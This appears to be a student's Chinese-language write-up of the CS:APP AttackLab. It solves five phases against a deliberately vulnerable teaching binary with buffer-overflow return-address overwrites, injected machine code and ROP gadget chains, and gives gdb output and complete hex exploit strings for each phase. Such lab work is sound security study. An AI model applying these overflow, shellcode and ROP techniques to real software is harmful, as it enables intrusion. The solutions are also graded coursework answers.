## AttackLab

### Preparation

1. 栈帧结构

   ![https://i.imgur.com/uKHxdys.png](https://i.imgur.com/uKHxdys.png)

### Phase 1

根据提示，Phase 1 中告诉我们 ctarget 程序运行时的有效信息如下：

1. ctarget 会先调用 `test` 函数。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

2. `getbuf` 类似与 C 标准库中的  `gets`函数

3. 这个程序里同时存在一个 `touch1 `函数，我们要做的是通过输入数据，执行到 `touch1`函数

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

首先，我们肯定要看一下 `getbuf` 这个函数做了些什么。

```assembly
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp # 开辟0x28字节（40字节）栈空间
   0x00000000004017ac <+4>:     mov    %rsp,%rdi # 给到第一个参数
   0x00000000004017af <+7>:     call   0x401a40 <Gets> # 读入40个字节到栈内存。但是正因为它说明了和 gets 函数相同，说明它不会判断缓冲区的大小，有可能导致读入超出 40 个字节从而污染调用栈
   0x00000000004017b4 <+12>:    mov    $0x1,%eax # 设置返回值为 1
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

当读入超过给定缓冲区大小的数据时，`gets` 函数就会污染调用栈，从而产生安全问题，这也是 `gets` 函数被不建议使用的原因。根据栈帧结构，可以分析出

```assembly
%rsp -- %rsp - 0x28 : 缓冲区数组
%rsp + 0x8 -- %rsp : 返回地址
```

原本 `%rsp + 0x8 -- %rsp` 应该返回到 `printf` 语句所在的地址，只需要把这个地址覆盖为 `touch1` 函数的地址即可。

```assembly
(gdb) x touch1
0x4017c0 <touch1>:      0x08ec8348
```

如下：缓冲区数据可以任意填写。

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

通过 hex2raw 程序可以将 16 进制字符串转换为 2进制字符串（空格和换行都会被 trim 掉）

```bash
❯ ./hex2raw < ./ans/phase_1.txt > ./ans/phase_1
❯ ./ctarget -qi ./ans/phase_1
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

在我的本机测试，直接一段命令使用管道运算符会出现段错误，目前原因未知，推测可能是 `-i`参数的问题，见 Phase 2。

### Phase 2

与Phase 1 共有一个程序，Phase 2 要求我们调用到 touch2 函数，并且正确传入参数（在 cookie.txt 里）

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

思路比较简单。因为  `test` 函数会向栈空间写入数据，只要栈内存是可执行的，我们可以把在 Phase 1里填入的无用的数据换成自己编写的代码。然后在移除后的返回地址从 `touch1` 函数的地址换成我们自己编写的代码的首地址。

我们自己编写的那段代码需要做两件事：

1. 需要将 `%rsi` 寄存器修改为我们想要的值
2. 调用 `touch2` 函数。（将 `touch2` 函数的地址压栈后调用 `ret` 指令即可实现）

首先找一下  `touch2` 函数的地址

```assembly
(gdb) p touch2
$1 = {void (unsigned int)} 0x4017ec <touch2>
```

据此得到我们应该编写的汇编代码

```assembly
mov    $0x59b997fa,%rdi
push   $0x4017ec
ret
```

通过 `gcc -c` 命令汇编成机器码后可以使用其他程序将其转换为机器码对应的 16 进制表示或通过 `objdump -d` 转换。

但是还有一个问题，就是如何确定我们要修改 `test` 函数的返回地址。因为这个程序没有开启栈随机化，每次运行时栈地址确定的，所以可以打断点运行一下找到栈顶地址就是我们写入代码的第一个地址。

```assembly
(gdb) b *0x4017ac
Breakpoint 1 at 0x4017ac: file buf.c, line 14.
(gdb) r -q -i ./ans/phase_1 # 经过尝试不写 -i 参数会出现段错误，所以借用下 phase 1 的答案，反正不会对我们要找的栈指针造成影响
Starting program: /mnt/d/Projects/Personal/csapp-lab/attacklab/attack-handout/ctarget -q -i ./ans/phase_1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) p/x $rsp
$1 = 0x5561dc78
```

得到我们注入代码的首地址是 `0x5561dc78` ，把这段地址替换掉 Phase 1 中的 `touch2` 函数地址即可

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

当然注入的代码也可以写道中间行，然后返回地址也需要对栈顶指针相应加一个偏移量指向我们注入代码的首地址，不过真的有人会这样做吗？

### Phase 3

与 Phase 1、2 共用一个程序，Phase 3 要求我们调用到 touch3 函数，要求我们将 cookie 以字符串的形式传入（而不是像 Phase 2 一样传入一个16进制的立即数）

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
     char cbuf[110];
     /* Make position of check string unpredictable */
     char *s = cbuf + random() % 100;
     sprintf(s, "%.8x", val);
     return strncmp(sval, s, 9) == 0;
}
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
    } else {
         printf("Misfire: You called touch3(\"%s\")\n", sval);
         fail(3);
     }
    exit(0);
}
```

根据所给的最后一条提示，我们的字符串不能存放到 `getbuf` 栈帧中，而应该存到 `test` 函数栈帧中。剩下的步骤就比较好办了

> When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
> portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful
> where you place the string representation of your cookie.  

1. 确认字符串 `59b997fa` 的16进制表示，可以手查 ASCII 码表或网上有一键转换的工具（根据第二条提示，注入的字符串需要添加字符串终止符 `\0`

   ```
   35 39 62 39 39 37 66 61 00
   ```

2. 确认我们应该注入字符串地址在哪里，根据最后一条地址，应该在`getbuf` 返回地址的上方，函数 `test`栈帧中，确保我们注入的字符串不会被覆盖。通过在 `getbuf` 函数开辟栈空间这里打断点可以观察到此时栈地址是 `0x5561dca0` 这应该是 `test` 函数的返回地址，也是我们要注入成 `touch3` 函数的地址

    ```assembly
    (gdb) b *0x4017a8
    Breakpoint 1 at 0x4017a8: file buf.c, line 12.
    (gdb) r -q -i ./ans/phase_1
    Starting program: /mnt/d/Projects/Personal/csapp-lab/attacklab/attack-handout/ctarget -q -i ./ans/phase_1
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Cookie: 0x59b997fa
    
    Breakpoint 1, getbuf () at buf.c:12
    12      buf.c: No such file or directory.
    (gdb) info r rsp
    rsp            0x5561dca0          0x5561dca0
    ```

    `test` 函数的返回地址占了 8 字节，0x5561dca0 + 0x8 = 0x5561dca8 就是我们注入的字符串的地址

3. 找到 touch3 函数地址

    ```assembly
    (gdb) x touch3
    0x4018fa <touch3>:      0xfb894853
    ```

4. 编写汇编代码，其余操作均与 Phase 2 类似

   ```assembly
   mov $0x5561dca8, %rdi
   push $0x4018fa
   ret
   ```

5. 构造输入内容

   ```
   48 c7 c7 a8 dc 61 55 68
   fa 18 40 00 c3 00 00 00 
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   00 00 00 00 00 00 00 00
   78 dc 61 55 00 00 00 00 
   35 39 62 39 39 37 66 61 00
   ```

### Phase 4

Phase 4 的要求同 Phase 2，但是从 Phase 4 开始所用到的程序就开启了栈随机化（栈的地址将是不固定的）和并限制了可执行代码的区域（像我们在 Phase 2 中那样编写汇编代码再会变成机器指令写入缓冲区再执行就是不可能的了）

ROP 攻击就是在程序内部寻找一些可以利用的指令片段，构造出我们想要执行的指令，这些片段称为 gadgets

提示中告诉我们 gadgets 位于 `start_farm` 和 `mid_farm ` 之间。合法的 gadgets 必须最后是 `ret` 指令

```assembly
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    
```

由于这个题目约束我们只能使用 `movq`、`popq`、`ret` 和 `ret` 四种指令。所以我们的想法应该是先将我们的字符串放入栈顶，然后 `popq` 到 `%rdi`，这是最好的。但是经过查找并没有能实现 `popq %rdi` 指令的 gadget。那可以考虑先存入一个寄存器，再 `movq` 到 `%rdi`

在 `addval_219` 可以找到 `popq %rax` 对应的指令 `58` 之后紧接 `90`是空操作然后是 `ret` 符合我们的要求，对应的地址是 `0x4019ab` （并不唯一）

在 `addval_273` 可以找到 `movq %rax,%rdi` 对应的指令 `48 89 c7` 之后接的 `c3`是 `ret`指令符合要求，对应地址是 `0x4019a2`（并不唯一）

由此可以得出输入内容

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 // (popq %rax then ret)
fa 97 b9 59 00 00 00 00 // 0x59b997fa
a2 19 40 00 00 00 00 00 // (movq %rax, %rdi then ret)
ec 17 40 00 00 00 00 00 // touch2
```

### Phase 5

Phase 5 的要求同 Phase 3，相比于 Phase 4 给我们的 gadgets 更多了。我们改写 Phase 3 中编写的汇编代码，借助于 gadgets 实现类似的功能。位于 `start_farm` 和 `end_farm ` 之间。因为开启了栈随机化，我们无法将字符串写入到 `test` 栈区后会无法得知地址。观察到 gadgets 中有一个 `add_xy` 函数，如下

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret    
```

可以实现 %rax = %rdi + %rsi 的操作，我们可以将字符串保存在栈上，然后借助偏移量把字符串地址保存到 `%rax`，再按照 Phase 4 的方法转移到 `%rdi`上。我们可以构造出如下汇编代码。

```assembly
movq %rsp,%rax
movq %rax, %rdi # 将栈顶地址存入%rdi中

popq %rax
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi # 将偏移量存入%esi中

leaq (%rdi,%rsi,1),%rax # %rax = %rdi + %rsi
movq %rax, %rdi
```

需要使用的 gadgets （不唯一）

```assembly
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax # 48 89 e0 -> movq %rsp,%rax
  401a09:	c3                   	ret 
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax  # 48 89 c7 -> movq %rax, %rdi
  4019a6:	c3                   	ret    
  
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax # 58 -> popq %rax 
  4019ad:	c3                   	ret  
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax # 89 c2 -> movl %eax, %edx
  4019e0:	c3                   	ret 
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax # 89 d1 -> movl %edx, %ecx
  401a38:	c3                   	ret    
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax # 89 ce -> movl %ecx, %esi
  401a17:	c3                   	ret    
  
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax # leaq (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret    
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax # 48 89 c7 -> movq %rax, %rdi
  4019a6:	c3                   	ret    
```

由此可以得出输入内容。

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00 // cookie 与返回地址相隔 9 条指令，所以偏移量应为 8*9=0x48
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```

最后这一个难度确实较大，参考了许多解析才得以完成。
